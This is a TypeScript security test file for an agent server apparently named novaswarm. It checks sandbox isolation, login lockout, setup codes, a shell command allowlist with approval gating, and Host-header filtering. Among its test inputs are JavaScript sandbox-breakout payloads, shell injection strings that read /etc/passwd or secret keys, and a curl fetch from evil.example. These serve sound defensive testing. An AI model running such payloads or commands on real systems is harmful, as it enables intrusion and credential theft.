import assert from 'node:assert/strict';
import express from 'express';
import fs from 'node:fs';
import http from 'node:http';
import net from 'node:net';
import os from 'node:os';
import path from 'node:path';
import test from 'node:test';
import { executeHostCommandForAgent } from '../server/agents/engine';
import { executeAgentTool } from '../server/agents/tools';
import { createOpenAiProxyRouter } from '../server/gateway/openaiProxy';
import {
  createAndSelfTestDynamicTool,
  executeIsolatedJsInSubprocess,
} from '../server/power/batch5AutonomyEngine';
import { executeDynamicTool } from '../server/power/universalSuite';
import { createApiRouter } from '../server/routes/api';
import {
  ensureOneTimeSetupCode,
  getWsUpgradeDecision,
  isAllowedHostHeader,
  requireAllowedHostMiddleware,
  resetAuthSecurityStateForTests,
} from '../server/security/auth';
import { constantTimeEqual } from '../server/security/egressAndCrypto';
import {
  parseSafeAllowlistedHostCommand,
  shouldRequireDangerousExecApproval,
} from '../server/security/permissionGate';
import {
  createDefaultApiRateLimitMiddleware,
  createPublicRouteRateLimitMiddleware,
  createSelectiveJsonBodyMiddleware,
  resetRateLimitersForTests,
} from '../server/security/rateLimit';
import {
  createInitialState,
  getState,
  resetInMemoryStateForTests,
  setWebAuthPassword,
  updateState,
} from '../server/state/store';
import {
  checkOtaUpdates,
  evaluateOtaSignaturePolicy,
  maybeSendDailyAuditAnchorToTelegram,
  requestOsPackageUpgrade,
} from '../server/system/ops';

function rawHttpRequest(opts: {
  port: number;
  method?: string;
  path: string;
  headers?: Record<string, string>;
  body?: string;
}): Promise<{ statusCode: number; headers: http.IncomingHttpHeaders; body: string }> {
  return new Promise((resolve, reject) => {
    const req = http.request(
      {
        host: '127.0.0.1',
        port: opts.port,
        method: opts.method || 'GET',
        path: opts.path,
        headers: opts.headers,
      },
      (res) => {
        const chunks: Buffer[] = [];
        res.on('data', (c) => chunks.push(Buffer.isBuffer(c) ? c : Buffer.from(c)));
        res.on('end', () => {
          resolve({
            statusCode: res.statusCode || 0,
            headers: res.headers,
            body: Buffer.concat(chunks).toString('utf8'),
          });
        });
      }
    );
    req.on('error', reject);
    if (opts.body) req.write(opts.body);
    req.end();
  });
}

function rawWsUpgradeProbe(opts: { port: number; hostHeader: string; path?: string }): Promise<string> {
  return new Promise((resolve, reject) => {
    const sock = net.createConnection({ host: '127.0.0.1', port: opts.port }, () => {
      sock.write(
        `GET ${opts.path || '/ws/events'} HTTP/1.1\r\n` +
          `Host: ${opts.hostHeader}\r\n` +
          `Upgrade: websocket\r\n` +
          `Connection: Upgrade\r\n` +
          `Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\n` +
          `Sec-WebSocket-Version: 13\r\n\r\n`
      );
    });
    let data = '';
    sock.on('data', (chunk) => {
      data += chunk.toString('utf8');
      sock.destroy();
      resolve(data);
    });
    sock.on('error', (err) => reject(err));
  });
}

test('Pass 2 Fix 1 (MAGAS): sandbox_js blocks prototype/constructor breakout, Function, require, process, import()', async () => {
  resetInMemoryStateForTests(createInitialState());

  const breakoutPayloads = [
    'return Math.constructor.constructor("return process")().env',
    'return JSON.stringify(Date.constructor.constructor("return process.version")())',
    'return Function("return process")().pid',
    'return import("node:fs")',
    'return process.env',
    'return globalThis.process',
    'return require("node:child_process").execSync("id")',
    'return eval("process.env")',
  ];

  for (const payload of breakoutPayloads) {
    assert.throws(
      () => executeIsolatedJsInSubprocess(payload, { sample: 1 }),
      `Direct subprocess sandbox must reject breakout: ${payload}`
    );

    await assert.rejects(
      () =>
        createAndSelfTestDynamicTool({
          name: `breakout_${Math.random().toString(36).slice(2, 6)}`,
          description: 'Breakout test',
          kind: 'sandbox_js',
          targetOrCode: payload,
        }),
      /füsttesztje elbukott/,
      `createAndSelfTestDynamicTool must reject breakout: ${payload}`
    );

    const execRes = await executeDynamicTool(
      {
        id: 'dyn-test',
        name: 'breakout_probe',
        description: 'Breakout probe',
        kind: 'sandbox_js',
        targetOrCode: payload,
        enabled: true,
        createdAt: new Date().toISOString(),
      },
      { sample: 1 }
    );
    assert.equal(execRes.ok, false, `Execution must fail closed: ${payload}`);
    assert.equal(/\/root|\/home|PATH=|UID=/.test(execRes.output), false);
  }

  // Legitimate deterministic computation using cloned input still works cleanly
  const validDyn = await createAndSelfTestDynamicTool({
    name: 'safe_calc',
    description: 'Safe pure arithmetic',
    kind: 'sandbox_js',
    targetOrCode: 'return Number(input.sample || 5) * 2;',
    testInput: { sample: 42 },
  });
  assert.equal(validDyn.ok, true);
  assert.equal(validDyn.testOutput, '84');
});

test('Pass 2 Fix 2 (KÖZEPES): POST /auth/login enforces IP brute-force lockout (6th wrong attempt -> 429) & audit log', async () => {
  const tmpLog = path.join(os.tmpdir(), `novaswarm-setup-p2-${process.pid}-${Date.now()}.log`);
  process.env.NOVASWARM_SETUP_LOG_PATH = tmpLog;
  const s = createInitialState();
  s.settings.webAuthEnabled = true;
  resetInMemoryStateForTests(s);
  resetAuthSecurityStateForTests();
  setWebAuthPassword('SzuperTitkosJelszo99!');

  assert.equal(constantTimeEqual('abc123', 'abc123'), true);
  assert.equal(constantTimeEqual('abc123', 'abc124'), false);
  assert.equal(constantTimeEqual('short', 'much-longer-secret'), false);

  const app = express();
  app.use(express.json());
  app.use('/api', createApiRouter(() => {}));
  const server = app.listen(0, '127.0.0.1');
  await new Promise<void>((resolve) => server.once('listening', resolve));
  const port = (server.address() as { port: number }).port;

  try {
    // Attempts 1..5 fail with 401
    for (let i = 1; i <= 5; i++) {
      const res = await fetch(`http://127.0.0.1:${port}/api/auth/login`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ password: `wrong-${i}` }),
      });
      assert.equal(res.status, 401, `Attempt ${i} should return 401`);
    }

    // Attempt 6 MUST return 429 Too Many Requests with Retry-After header
    const blockedRes = await fetch(`http://127.0.0.1:${port}/api/auth/login`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ password: 'wrong-6' }),
    });
    assert.equal(blockedRes.status, 429);
    assert.ok(Number(blockedRes.headers.get('retry-after')) >= 30);

    // Even valid password must be blocked while rate lock active, until state reset
    const lockedValidRes = await fetch(`http://127.0.0.1:${port}/api/auth/login`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ password: 'SzuperTitkosJelszo99!' }),
    });
    assert.equal(lockedValidRes.status, 429);

    const secLogs = getState().auditLogs;
    assert.ok(
      secLogs.some((l) => l.type === 'security' && l.message.includes('Sikertelen belépési kísérlet'))
    );
  } finally {
    setWebAuthPassword('');
    resetAuthSecurityStateForTests();
    delete process.env.NOVASWARM_SETUP_LOG_PATH;
    if (fs.existsSync(tmpLog)) fs.rmSync(tmpLog, { force: true });
    server.closeAllConnections?.();
    await new Promise<void>((resolve) => server.close(() => resolve()));
  }
});

test('Pass 2 Fix 3 (KÖZEPES): First-install /auth/password requires one-time setup code and burns it after first use', async () => {
  const tmpLog = path.join(os.tmpdir(), `novaswarm-setup-test-${process.pid}-${Date.now()}.log`);
  process.env.NOVASWARM_SETUP_LOG_PATH = tmpLog;
  try {
    const s = createInitialState();
    s.settings.webAuthEnabled = true;
    resetInMemoryStateForTests(s);
    setWebAuthPassword('');
    resetAuthSecurityStateForTests();

    const code = ensureOneTimeSetupCode();
    assert.ok(code && code.length >= 12);
    assert.ok(fs.existsSync(tmpLog));

    const app = express();
    app.use(express.json());
    app.use('/api', createApiRouter(() => {}));
    const server = app.listen(0, '127.0.0.1');
    await new Promise<void>((resolve) => server.once('listening', resolve));
    const port = (server.address() as { port: number }).port;

    try {
      // Status never leaks the setup code itself
      const statusRes = await fetch(`http://127.0.0.1:${port}/api/auth/status`);
      const statusText = await statusRes.text();
      assert.equal(statusText.includes(code), false);

      // Missing setup code -> 403
      const noCodeRes = await fetch(`http://127.0.0.1:${port}/api/auth/password`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ password: 'ErosJelszo123!', enable: true }),
      });
      assert.equal(noCodeRes.status, 403);

      // Wrong setup code -> 403
      const badCodeRes = await fetch(`http://127.0.0.1:${port}/api/auth/password`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ password: 'ErosJelszo123!', setupCode: 'DEAD-BEEF-0000', enable: true }),
      });
      assert.equal(badCodeRes.status, 403);

      // Valid setup code -> 200 and claims password
      const okRes = await fetch(`http://127.0.0.1:${port}/api/auth/password`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ password: 'ErosJelszo123!', setupCode: code, enable: true }),
      });
      assert.equal(okRes.status, 200);

      // Second unauthenticated attempt with same setupCode MUST fail (401 auth required, code burned)
      const reuseRes = await fetch(`http://127.0.0.1:${port}/api/auth/password`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ password: 'MasikJelszo123!', setupCode: code, enable: true }),
      });
      assert.equal(reuseRes.status, 401);
    } finally {
      setWebAuthPassword('');
      resetAuthSecurityStateForTests();
      server.closeAllConnections?.();
      await new Promise<void>((resolve) => server.close(() => resolve()));
    }
  } finally {
    delete process.env.NOVASWARM_SETUP_LOG_PATH;
    if (fs.existsSync(tmpLog)) fs.rmSync(tmpLog, { force: true });
  }
});

test('Pass 2 Fix 4 (KÖZEPES): Shell exec blocks ; | && $() ` and ../ via allowlist; fullAutonomousMode never bypasses exec approval', async () => {
  const s = createInitialState();
  s.settings.hostPermissionsGranted = true;
  s.settings.fullAutonomousMode = true; // Must NOT bypass shell approval!
  s.settings.dangerousExecAutoApprove = false;
  resetInMemoryStateForTests(s);

  const agent = {
    ...s.agents[0],
    id: 'test-exec-agent',
    name: 'ShellTest',
    isSupervisor: false,
    hostExecutionEnabled: true,
  };

  // Safe allowlisted read-only commands work with shell:false
  assert.equal(parseSafeAllowlistedHostCommand('ls -la').allowed, true);
  assert.equal(parseSafeAllowlistedHostCommand('cat package.json').allowed, true);
  assert.equal(parseSafeAllowlistedHostCommand('uptime').allowed, true);

  const safeOut = executeHostCommandForAgent(agent, 'cat package.json');
  assert.equal(safeOut.executed, true);
  assert.match(safeOut.stdout, /"name":\s*"novaswarm"/);

  // Dangerous metacharacters & traversal MUST be rejected from allowlist and queued for approval
  const maliciousCommands = [
    'ls ; id',
    'uptime | cat /etc/passwd',
    'ls && whoami',
    'cat $(echo package.json)',
    'ls `id`',
    'cat ../etc/passwd',
    'cat .secrets.key',
    'rm -rf /tmp/nonexistent-x',
    'curl http://evil.example/a.sh',
  ];

  assert.equal(shouldRequireDangerousExecApproval(), true);

  for (const cmd of maliciousCommands) {
    assert.equal(parseSafeAllowlistedHostCommand(cmd).allowed, false, `Must reject from allowlist: ${cmd}`);

    const engRes = executeHostCommandForAgent(agent, cmd);
    assert.equal(engRes.executed, false);
    assert.equal(engRes.pendingApproval, true);
    assert.ok(engRes.approvalId);

    const toolRes = await executeAgentTool({
      agent,
      toolName: 'exec_shell',
      args: { command: cmd },
      isolationMode: 'main_host',
    });
    assert.equal(toolRes.step.ok, false);
    assert.match(toolRes.observation, /Jóváhagyási sorba téve/);
  }

  // OS upgrade is ALSO still gated despite fullAutonomousMode === true
  const osUp = requestOsPackageUpgrade('TestUser');
  assert.equal(osUp.executedDirectly, false);
  assert.ok(osUp.queuedApprovalId);

  // Only explicit Veszélyes Zóna toggle unlocks non-allowlisted execution, with security audit log
  updateState((st) => {
    st.settings.dangerousExecAutoApprove = true;
  });
  assert.equal(shouldRequireDangerousExecApproval(), false);
  const dangerRes = executeHostCommandForAgent(agent, 'echo DANGER_ZONE_OK');
  assert.equal(dangerRes.executed, true);
  assert.match(dangerRes.stdout, /DANGER_ZONE_OK/);
  assert.ok(
    getState().auditLogs.some(
      (l) => l.type === 'security' && l.message.includes('VESZÉLYES ZÓNA')
    )
  );
});

test('Pass 2 Fix 5 (KÖZEPES): DNS rebinding Host allowlist returns 403 on evil.example (HTTP, SSE, /v1, WS) and allows LAN/localhost', async () => {
  const tmpLog = path.join(os.tmpdir(), `novaswarm-setup-p5-${process.pid}-${Date.now()}.log`);
  process.env.NOVASWARM_SETUP_LOG_PATH = tmpLog;
  const s = createInitialState();
  s.settings.webAuthEnabled = false;
  resetInMemoryStateForTests(s);

  assert.equal(isAllowedHostHeader('evil.example'), false);
  assert.equal(isAllowedHostHeader('evil.example:3000'), false);
  assert.equal(isAllowedHostHeader('169.254.169.254'), false);
  assert.equal(isAllowedHostHeader('localhost:3000'), true);
  assert.equal(isAllowedHostHeader('127.0.0.1:3000'), true);
  assert.equal(isAllowedHostHeader('[::1]:3000'), true);
  assert.equal(isAllowedHostHeader('192.168.1.55:3000'), true);
  assert.equal(isAllowedHostHeader('10.0.0.12:3000'), true);
  assert.equal(isAllowedHostHeader('raspi.local:3000'), true);

  const app = express();
  app.use(requireAllowedHostMiddleware);
  app.use(express.json());
  app.get('/sse-test', (_req, res) => {
    res.setHeader('Content-Type', 'text/event-stream');
    res.write('data: ok\n\n');
    res.end();
  });
  app.use('/api', createApiRouter(() => {}));
  app.use('/v1', createOpenAiProxyRouter(() => {}));

  const server = http.createServer(app);
  server.on('upgrade', (request, socket) => {
    const decision = getWsUpgradeDecision(request);
    if (!decision.authorized) {
      const statusText = decision.statusCode === 403 ? 'Forbidden' : 'Unauthorized';
      socket.write(`HTTP/1.1 ${decision.statusCode} ${statusText}\r\n\r\n`);
      socket.destroy();
      return;
    }
    socket.write('HTTP/1.1 101 Switching Protocols\r\n\r\n');
    socket.destroy();
  });

  await new Promise<void>((resolve) => server.listen(0, '127.0.0.1', () => resolve()));
  const port = (server.address() as { port: number }).port;

  try {
    // Evil Host on API -> 403
    const evilApi = await rawHttpRequest({
      port,
      path: '/api/auth/status',
      headers: { Host: 'evil.example' },
    });
    assert.equal(evilApi.statusCode, 403);

    // Evil Host on SSE -> 403
    const evilSse = await rawHttpRequest({
      port,
      path: '/sse-test',
      headers: { Host: 'evil.example:3000' },
    });
    assert.equal(evilSse.statusCode, 403);

    // Evil Host on /v1 -> 403
    const evilV1 = await rawHttpRequest({
      port,
      path: '/v1/models',
      headers: { Host: 'rebind.evil.com' },
    });
    assert.equal(evilV1.statusCode, 403);

    // Evil Host on WS upgrade -> 403 Forbidden
    const evilWs = await rawWsUpgradeProbe({ port, hostHeader: 'evil.example' });
    assert.match(evilWs, /^HTTP\/1\.1 403 Forbidden/);

    // Valid LAN Host 192.168.1.55 -> passes (200)
    const lanOk = await rawHttpRequest({
      port,
      path: '/api/auth/status',
      headers: { Host: `192.168.1.55:${port}` },
    });
    assert.equal(lanOk.statusCode, 200);

    // Valid localhost WS upgrade -> passes
    const localWs = await rawWsUpgradeProbe({ port, hostHeader: `localhost:${port}` });
    assert.match(localWs, /^HTTP\/1\.1 101/);
  } finally {
    delete process.env.NOVASWARM_SETUP_LOG_PATH;
    if (fs.existsSync(tmpLog)) fs.rmSync(tmpLog, { force: true });
    resetAuthSecurityStateForTests();
    server.closeAllConnections?.();
    await new Promise<void>((resolve) => server.close(() => resolve()));
  }
});

test('Pass 2 Fix 6 (ALACSONY): 1mb/25mb JSON limits, /api & /burn rate limits, OTA warning, Telegram audit anchor, package.json name', async () => {
  resetInMemoryStateForTests(createInitialState());
  resetRateLimitersForTests();

  // 1. package.json name is novaswarm
  const pkg = JSON.parse(fs.readFileSync(path.join(process.cwd(), 'package.json'), 'utf8')) as {
    name?: string;
  };
  assert.equal(pkg.name, 'novaswarm');

  // 2. Selective JSON body limits (1mb default, 25mb upload endpoints) + rate limiters
  const app = express();
  app.use(createSelectiveJsonBodyMiddleware());
  const apiLimit = createDefaultApiRateLimitMiddleware(4);
  const pubLimit = createPublicRouteRateLimitMiddleware(2);
  app.use('/api', apiLimit);
  app.use('/burn', pubLimit);
  app.post('/api/settings', (_req, res) => res.json({ ok: true }));
  app.post('/api/rag/upload', (req, res) => res.json({ bytes: JSON.stringify(req.body).length }));
  app.get('/burn/:token', (_req, res) => res.send('ok'));

  const server = app.listen(0, '127.0.0.1');
  await new Promise<void>((resolve) => server.once('listening', resolve));
  const port = (server.address() as { port: number }).port;

  try {
    const bigPayload = JSON.stringify({ pad: 'a'.repeat(1_200_000) });

    // > 1mb rejected on normal route (413)
    const tooBigNormal = await fetch(`http://127.0.0.1:${port}/api/settings`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: bigPayload,
    });
    assert.equal(tooBigNormal.status, 413);

    // > 1mb accepted on /api/rag/upload (200)
    const okUpload = await fetch(`http://127.0.0.1:${port}/api/rag/upload`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: bigPayload,
    });
    assert.equal(okUpload.status, 200);

    // Public /burn stricter rate limit triggers 429 on 3rd request
    assert.equal((await fetch(`http://127.0.0.1:${port}/burn/t1`)).status, 200);
    assert.equal((await fetch(`http://127.0.0.1:${port}/burn/t2`)).status, 200);
    const pubBlocked = await fetch(`http://127.0.0.1:${port}/burn/t3`);
    assert.equal(pubBlocked.status, 429);

    // General /api rate limit (max=4; /api/rag/upload already counted as #1) triggers 429 on 5th request
    assert.equal((await fetch(`http://127.0.0.1:${port}/api/settings`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: '{}' })).status, 200);
    assert.equal((await fetch(`http://127.0.0.1:${port}/api/settings`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: '{}' })).status, 200);
    assert.equal((await fetch(`http://127.0.0.1:${port}/api/settings`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: '{}' })).status, 200);
    const apiBlocked = await fetch(`http://127.0.0.1:${port}/api/settings`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: '{}',
    });
    assert.equal(apiBlocked.status, 429);
  } finally {
    resetRateLimitersForTests();
    server.closeAllConnections?.();
    await new Promise<void>((resolve) => server.close(() => resolve()));
  }

  // 3. OTA signature warning when no signed tags are present
  const prevSigEnv = process.env.NOVASWARM_VERIFY_TAG_SIG;
  delete process.env.NOVASWARM_VERIFY_TAG_SIG;
  const sigPolicy = evaluateOtaSignaturePolicy();
  assert.equal(sigPolicy.signatureVerificationActive, false);
  assert.ok(sigPolicy.signatureWarning && sigPolicy.signatureWarning.includes('Aláíratlan'));

  const ota = await checkOtaUpdates(
    (async () => new Response(JSON.stringify({ tag_name: 'v1.0.0' }), { status: 200 })) as typeof fetch
  );
  assert.equal(ota.signatureVerificationActive, false);
  assert.ok(ota.signatureWarning);

  process.env.NOVASWARM_VERIFY_TAG_SIG = '1';
  assert.equal(evaluateOtaSignaturePolicy().signatureVerificationActive, true);
  if (prevSigEnv === undefined) delete process.env.NOVASWARM_VERIFY_TAG_SIG;
  else process.env.NOVASWARM_VERIFY_TAG_SIG = prevSigEnv;

  // 4. Daily Telegram audit head-hash anchor sends once per day
  updateState((st) => {
    st.settings.sendAuditAnchorToTelegram = true;
    st.settings.lastAuditAnchorSentDate = null;
  });
  const sentMessages: string[] = [];
  const firstAnchor = await maybeSendDailyAuditAnchorToTelegram(async (txt) => {
    sentMessages.push(txt);
  });
  assert.equal(firstAnchor.sent, true);
  assert.equal(sentMessages.length, 1);
  assert.match(sentMessages[0], /Fej-hash \(HMAC-SHA256\)/);

  const secondAnchorSameDay = await maybeSendDailyAuditAnchorToTelegram(async (txt) => {
    sentMessages.push(txt);
  });
  assert.equal(secondAnchorSameDay.sent, false);
  assert.equal(sentMessages.length, 1);
});
